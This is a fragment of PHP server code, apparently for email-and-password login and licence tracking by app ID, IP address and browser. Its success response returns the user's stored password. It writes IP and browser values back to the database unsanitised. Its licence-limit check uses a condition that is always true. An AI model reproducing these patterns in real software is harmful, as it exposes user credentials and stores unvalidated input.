                $app = self::$conOfDatabase->getPrdLcnDtlByPrdId((int)Decryption::static(array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "app_id")));
                if (array_value($app, "ipAddress") && array_value($app, "ipAddress") !== removeTags(array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "ip"))) {
                    self::$conOfDatabase->resetItmFrmLcnByPrdId(
                        (int)Decryption::static(array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "app_id")),
                        "ipAddress",
                        array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "ip")
                    );
                }
                if (array_value($app, "browserNameFull") && array_value($app, "browserNameFull") !== removeTags(
                    array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "browser")
                )) {
                    self::$conOfDatabase->resetItmFrmLcnByPrdId(
                        (int)Decryption::static(array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "app_id")),
                        "browserNameFull",
                        array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "browser")
                    );
                }
            }

            if (is_array($userDetails) && count($userDetails) > 0) {
                self::$conOfDatabase->updateIdNbOfPrdOfUsr(
                    Number::filterInt($IdNbOfUsr),
                    Decryption::static(array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "app_id"))
                );

                self::$conOfDatabase->updateUsrLcn(
                    Number::filterInt($IdNbOfUsr),
                    Decryption::static(array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "app_id"))
                );
                self::upgradeLcnLmt(Decryption::static(array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "app_id")));
                stream_to_json(
                    [
                        'message'    => 'success',
                        'login'      => 'passed',
                        'way'        => 'email_password',
                        'log_status' => 'success',
                        'user'       => [
                            'firstName'    => $userDetails['firstName'],
                            'lastName'     => $userDetails['lastName'],
                            'emailAddress' => $userDetails['emailAddress'],
                            'password'     => $userDetails['password'],
                        ],
                        'licence'    => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                            (int)Decryption::static(array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "app_id")),
                            removeTags(array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "ip")),
                            removeTags(array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "browser"))
                        ),
                    ]
                );
            } else {
                stream_to_json(['message' => 'error', 'login' => 'failed', 'way' => 'email_password']);
            }
        }

        private static function upgradeLcnLmt(string $prdId): void
        {
            $licence = self::$conOfDatabase->getPrdLcnDtlByPrdId((int)$prdId);
            if (Time::today() === array_value($licence, 'nextUpdate')) {
                if ($licence['limitBase'] !== null || $licence['limitBase'] !== 0 || $licence['limitBase'] !== 2000) {
                    self::$conOfDatabase->upgradeLcnLmt($prdId, $licence['limitBase']);
                }
            }
        }
    }
